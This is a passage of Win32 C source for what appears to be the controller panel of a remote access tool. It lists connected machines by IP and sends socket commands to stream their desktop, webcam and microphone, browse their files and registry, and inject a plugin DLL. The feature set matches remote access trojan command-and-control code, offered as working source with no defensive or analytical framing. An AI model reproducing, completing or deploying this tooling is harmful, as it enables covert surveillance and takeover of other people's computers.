                LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_PARAM; lvi.iItem = sel;
                ListView_GetItem(hListView, &lvi); activeClient = (ClientData*)lvi.lParam;
                
                if (LOWORD(wParam) >= IDM_START_CAM_BASE && LOWORD(wParam) <= IDM_START_CAM_BASE + 9) {
                    int camIdx = LOWORD(wParam) - IDM_START_CAM_BASE; BYTE cmd = 0x17;
                    send(activeClient->sock, (char*)&cmd, 1, 0); send(activeClient->sock, (char*)&camIdx, 4, 0);
                    ShowWindow(hCamWindow, SW_SHOW); UpdateWindow(hCamWindow); return 0;
                }

                BYTE cmd = 0; HWND targetWnd = NULL;
                if (LOWORD(wParam) == IDM_START_RDP) { cmd = 0x10; targetWnd = hRdpWindow; }
                if (LOWORD(wParam) == IDM_START_MIC) { cmd = 0x14; }
                if (LOWORD(wParam) == IDM_FETCH_CAM) { cmd = 0x16; } 
                if (LOWORD(wParam) == IDM_STOP_RDP) { cmd = 0x11; targetWnd = hRdpWindow; }
                if (LOWORD(wParam) == IDM_STOP_CAM) { cmd = 0x13; targetWnd = hCamWindow; }
                if (LOWORD(wParam) == IDM_STOP_MIC) { cmd = 0x15; }
                
                if (LOWORD(wParam) == IDM_FILE_MGR) {
                    strcpy(currentRemotePath, ""); cmd = 0x20;
                    send(activeClient->sock, (char*)&cmd, 1, 0); ShowWindow(hFileWindow, SW_SHOW); UpdateWindow(hFileWindow); cmd = 0; 
                }

                if (LOWORD(wParam) == IDM_REG_MGR) {
                    strcpy(currentRegPath, ""); cmd = 0x40; DWORD len = 0;
                    send(activeClient->sock, (char*)&cmd, 1, 0); send(activeClient->sock, (char*)&len, 4, 0);
                    ShowWindow(hRegWindow, SW_SHOW); UpdateWindow(hRegWindow); cmd = 0; 
                }
                
                if (LOWORD(wParam) == IDM_INJECT_PLUG) {
                    char pluginPath[MAX_PATH]; strcpy(pluginPath, "C:\\Temp\\Plugin.dll"); cmd = 0x30; DWORD len = (DWORD)strlen(pluginPath);
                    send(activeClient->sock, (char*)&cmd, 1, 0); send(activeClient->sock, (char*)&len, 4, 0); send(activeClient->sock, pluginPath, len, 0); cmd = 0;
                }
                
                if (LOWORD(wParam) == IDM_KICK_CLIENT) { cmd = 0x98; send(activeClient->sock, (char*)&cmd, 1, 0); closesocket(activeClient->sock); cmd = 0; }
                else if (LOWORD(wParam) == IDM_CLOSE_CLIENT) { cmd = 0x99; send(activeClient->sock, (char*)&cmd, 1, 0); closesocket(activeClient->sock); cmd = 0; }
                
                if (cmd != 0) send(activeClient->sock, (char*)&cmd, 1, 0);
                
                if (targetWnd) {
                    if (LOWORD(wParam) == IDM_STOP_RDP || LOWORD(wParam) == IDM_STOP_CAM) ShowWindow(targetWnd, SW_HIDE);
                    else if (LOWORD(wParam) == IDM_START_RDP) { ShowWindow(targetWnd, SW_SHOW); UpdateWindow(targetWnd); }
                }
            }
            return 0;
        }
        case WM_CLIENT_UPDATE_STATUS: {
            ClientData* target = (ClientData*)wParam;
            for (int i = 0; i < ListView_GetItemCount(hListView); i++) {
                LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_PARAM; lvi.iItem = i; ListView_GetItem(hListView, &lvi);
                if ((ClientData*)lvi.lParam == target) {
                    EnterCriticalSection(&target->cs); ListView_SetItemText(hListView, i, 2, target->status); LeaveCriticalSection(&target->cs); break;
                }
            }
            return 0;
        }
        case WM_CLIENT_UPDATE: {
            ClientData* client = (ClientData*)wParam; char idStr[16]; sprintf(idStr, "%d", client->id);
            LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_TEXT | LVIF_PARAM;
            lvi.iItem = ListView_GetItemCount(hListView); lvi.pszText = idStr; lvi.lParam = (LPARAM)client;
            int index = ListView_InsertItem(hListView, &lvi);
            ListView_SetItemText(hListView, index, 1, client->ipAddress); ListView_SetItemText(hListView, index, 2, client->status); return 0;
        }
        case WM_CLIENT_DISCONNECT: {
            ClientData* client = (ClientData*)wParam;
            for (int i = 0; i < ListView_GetItemCount(hListView); i++) {
                LVITEMA lvi; ZeroMemory(&lvi, sizeof(LVITEMA)); lvi.mask = LVIF_PARAM; lvi.iItem = i; ListView_GetItem(hListView, &lvi);
                if ((ClientData*)lvi.lParam == client) { ListView_DeleteItem(hListView, i); break; }
            }
            if (activeClient == client) { 
                activeClient = NULL; ShowWindow(hRdpWindow, SW_HIDE); ShowWindow(hCamWindow, SW_HIDE); ShowWindow(hFileWindow, SW_HIDE); ShowWindow(hRegWindow, SW_HIDE);
            }
            closesocket(client->sock); DeleteCriticalSection(&client->cs);
            if (client->latestRdpFrame) free(client->latestRdpFrame); if (client->latestCamFrame) free(client->latestCamFrame);
            if (client->latestFileList) free(client->latestFileList); if (client->latestRegList) free(client->latestRegList);
            delete client; return 0;
        }
        case WM_SIZE: SetWindowPos(hListView, NULL, 0, 0, LOWORD(lParam), HIWORD(lParam), SWP_NOZORDER); return 0;
        case WM_DESTROY: PostQuitMessage(0); return 0;
    }
    return DefWindowProcA(hwnd, msg, wParam, lParam);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR cmd, int show) {
    WSADATA wsa; WSAStartup(MAKEWORD(2, 2), &wsa);
    GdiplusStartupInput gdiplusStartupInput; ULONG_PTR gdiplusToken; GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    WNDCLASSEXA wcMain; ZeroMemory(&wcMain, sizeof(WNDCLASSEXA)); wcMain.cbSize = sizeof(WNDCLASSEXA); wcMain.lpfnWndProc = MainWndProc;
    wcMain.hInstance = hInstance; wcMain.hCursor = LoadCursor(NULL, IDC_ARROW); wcMain.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcMain.lpszClassName = "ServerMain"; RegisterClassExA(&wcMain);
    
    WNDCLASSEXA wcVideo; ZeroMemory(&wcVideo, sizeof(WNDCLASSEXA)); wcVideo.cbSize = sizeof(WNDCLASSEXA); wcVideo.lpfnWndProc = VideoWndProc;
    wcVideo.hInstance = hInstance; wcVideo.hCursor = LoadCursor(NULL, IDC_ARROW); wcVideo.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcVideo.lpszClassName = "VideoViewer"; RegisterClassExA(&wcVideo);

    WNDCLASSEXA wcFile; ZeroMemory(&wcFile, sizeof(WNDCLASSEXA)); wcFile.cbSize = sizeof(WNDCLASSEXA); wcFile.lpfnWndProc = FileMgrWndProc;
    wcFile.hInstance = hInstance; wcFile.hCursor = LoadCursor(NULL, IDC_ARROW); wcFile.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcFile.lpszClassName = "FileViewer"; RegisterClassExA(&wcFile);

    WNDCLASSEXA wcReg; ZeroMemory(&wcReg, sizeof(WNDCLASSEXA)); wcReg.cbSize = sizeof(WNDCLASSEXA); wcReg.lpfnWndProc = RegMgrWndProc;
    wcReg.hInstance = hInstance; wcReg.hCursor = LoadCursor(NULL, IDC_ARROW); wcReg.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcReg.lpszClassName = "RegViewer"; RegisterClassExA(&wcReg);

    hMainWindow = CreateWindowExA(0, "ServerMain", "Native C Server Controller", WS_OVERLAPPEDWINDOW, 100, 100, 600, 400, NULL, NULL, hInstance, NULL);
    hRdpWindow = CreateWindowExA(0, "VideoViewer", "Remote Desktop Stream", WS_OVERLAPPEDWINDOW, 200, 200, 800, 600, hMainWindow, NULL, hInstance, NULL);
    hCamWindow = CreateWindowExA(0, "VideoViewer", "Webcam Stream", WS_OVERLAPPEDWINDOW, 250, 250, 640, 480, hMainWindow, NULL, hInstance, NULL);
    hFileWindow = CreateWindowExA(0, "FileViewer", "Remote File Manager", WS_OVERLAPPEDWINDOW, 300, 300, 600, 450, hMainWindow, NULL, hInstance, NULL);
    hRegWindow = CreateWindowExA(0, "RegViewer", "Remote Registry Editor", WS_OVERLAPPEDWINDOW, 350, 350, 650, 450, hMainWindow, NULL, hInstance, NULL);

    ShowWindow(hMainWindow, show);
    MSG msg; while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
    
    if (hWaveOut) { waveOutReset(hWaveOut); waveOutClose(hWaveOut); }
    GdiplusShutdown(gdiplusToken); WSACleanup(); return 0;
}
